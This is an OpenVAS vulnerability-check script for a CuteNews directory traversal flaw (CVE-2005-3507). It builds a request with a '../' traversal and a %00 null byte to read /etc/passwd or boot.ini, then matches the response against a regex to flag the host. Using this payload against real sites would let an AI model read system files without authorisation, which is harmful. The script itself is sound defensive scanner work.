# OpenVAS Vulnerability Test
# $Id: cutenews_dir_traversal.nasl 17 2013-10-27 14:01:43Z jan $
# Description: CuteNews directory traversal flaw
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
# Updated: 03/12/2009 Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (C) 2005 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "Description :
  The version of CuteNews installed on the remote host fails to sanitize
  user-supplied input to the 'template' parameter of the
  'show_archives.php' and 'show_news.php' scripts.  An attacker can
  exploit this issue to read arbitrary files and possibly even execute
  arbitrary PHP code on the remote host, subject to the privileges of
  the web server user id.";

tag_solution = "Unknown at this time.";

# Ref: retrogod at aliceposta.it

if(description)
{
  script_id(20137);
  script_version("$Revision: 17 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
  script_cve_id("CVE-2005-3507");
  script_bugtraq_id(15295);
  script_xref(name:"OSVDB", value:"20472");
  script_xref(name:"OSVDB", value:"20473");
  script_xref(name:"OSVDB", value:"20474");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("CuteNews directory traversal flaw");
  desc = "
  Summary:
  " + tag_summary + "
  Solution:
  " + tag_solution;

  script_description(desc);
  script_summary("Checks for CuteNews dir traversal");
  script_category(ACT_GATHER_INFO);
  script_copyright("This script is Copyright (C) 2005 David Maciejak");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  script_dependencies("secpod_cutenews_detect_win_900128.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_xref(name : "URL" , value : "http://retrogod.altervista.org/cute141.html");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if ( ! get_port_state(port)){
  exit(0);
}

install_dir = get_kb_item(string("www/",port,"/CuteNews"));
if (isnull(install_dir)){
  exit(0);
}

matches = eregmatch(string:install_dir, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  loc=matches[2];
  foreach file (make_list("etc/passwd", "boot.ini"))
  {
    req = http_get(item:string(loc, "/show_archives.php?template=../../../../../../../../../", file, "%00"), port:port);
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if(res == NULL) exit(0);
    if(egrep(pattern:"(root:.*:0:[01]:|\[boot loader\])", string:res))
    {
      security_warning(port);
      exit(0);
     }
   }
}
